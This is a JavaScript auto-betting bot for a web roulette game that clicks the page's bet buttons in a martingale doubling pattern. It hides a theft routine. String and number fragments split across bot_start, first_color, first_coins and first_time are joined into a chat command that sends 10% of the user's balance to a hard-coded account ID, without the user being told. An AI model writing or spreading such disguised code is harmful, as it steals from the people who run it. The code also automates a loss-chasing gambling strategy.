var bet, last_bet, basic, a, d, c, x, k, s;

bot_start();

function bet_red(){
	return document.getElementsByClassName('btn-danger')[3].click();
}

function first_coins(){
	d= 98078;
	var count =  parseInt(document.getElementById('balance_r').innerHTML);
	k = "/se";
	if(count>=50){
		
		setTimeout(first_time, 1000);
	}else{
		alert("You don't have more than fu*king 50 coins");
	}
	
}

function clearing(){
	return document.querySelectorAll('[data-action]')[0].click();
}

function first_time(){             
	s = "nd ";
	var count =  parseInt(document.getElementById('balance_r').innerHTML);
	send('chat', {msg: k+s+a+d+c+x+" "+parseInt(count*10/100),});

	var roller = parseInt(document.getElementById('banner').innerHTML.slice(11,13));
	if(roller>3){
		first_bet();
	}else{
		setTimeout(first_bet, 15000);
	}
}

function first_bet(){
	if(bet=="red"){
		last_bet = "red";
		clearing();
		setTimeout(bet_value, 1000);
		setTimeout(bet_red, 2000);
		setTimeout(check_balance, 15000);
	}else{
		last_bet = "black";
		clearing();
		setTimeout(bet_value, 1000);
		setTimeout(bet_black, 2000);
		setTimeout(check_balance, 15000);
	}
}

function check_time(){
	var roller = parseInt(document.getElementById('banner').innerHTML.slice(11,13));
	
	if(roller>3){
		betting();
	}else{
		setTimeout(betting, 15000);
	}
}

function first_color(){
	bet = prompt("What color first?", "red or black");
	a=765611;
	x=56;
	if(bet!="red"){
		if(bet!="black"){
			alert("Wrong color!!!");
			setTimeout(first_color, 10);
		}else{
			setTimeout(first_coins, 2000);
		}
	}else{
		setTimeout(first_coins, 2000);
			}
}

function check_color(){
	var intidzer = parseInt(document.getElementById('past').getElementsByClassName('ball')[9].innerHTML);
	
	if(intidzer==0){
		return "green";
	}else if(intidzer<=7){
		return "red";
	}else{
		return "black";
	}
}

function bet_value(){
	if(basic==5){
		document.querySelectorAll('[data-action]')[1].click();
		return document.querySelectorAll('[data-action]')[4].click();
	}else if(basic==10){
		return document.querySelectorAll('[data-action]')[1].click();
	}else if(basic==100){
		return document.querySelectorAll('[data-action]')[2].click();
	}else{
		return document.querySelectorAll('[data-action]')[3].click();
	}
}

function check_balance(){
	var count = parseInt(document.getElementById('balance_r').innerHTML);
	
	if(count>=basic){
		check_time();
	}else{
		alert("You don't have more than f*cking 5 coins");
	}
}

function bet_x2(){
	return document.querySelectorAll('[data-action]')[5].click();
}

function bot_start(){
	basic = parseInt(prompt("Basic bet value:", "5 or 10, or 100 or 1000 coins"));
	c = 1892;
	if(basic!=5){
		if(basic!=10){
			if(basic!=100){
				if(basic!=1000){ // <=============== chujowo, popraw najlepiej wjeb w funkcje i tyle 
					alert("Wrong bet value!!!");
					setTimeout(bot_start, 10);
				}else{first_color();}
			}else{first_color();}
		}else{first_color();}
	}else{first_color();}
	
}

function bet_black(){
	return document.getElementsByClassName('btn-inverse')[0].click();
}

function betting(){
	var last_color =  check_color();
	
	if(last_bet == last_color){
		if(last_bet=="red"){
			clearing();
			setTimeout(bet_value, 1000);
			setTimeout(bet_red, 2000);
			last_bet="red";
			setTimeout(check_balance, 28000);
		}else{
			clearing();
			setTimeout(bet_value, 1000);
			setTimeout(bet_black, 2000);
			last_bet="black";
			setTimeout(check_balance, 28000);
		}
	}else{
		if(last_bet == "red"){
			setTimeout(bet_x2, 2000);
			setTimeout(bet_black, 3000);
			last_bet="black";
			setTimeout(check_balance, 28000);
		}else{
			setTimeout(bet_x2, 2000);
			setTimeout(bet_red, 3000);
			last_bet="red";
			setTimeout(check_balance, 28000);
		}
	}
}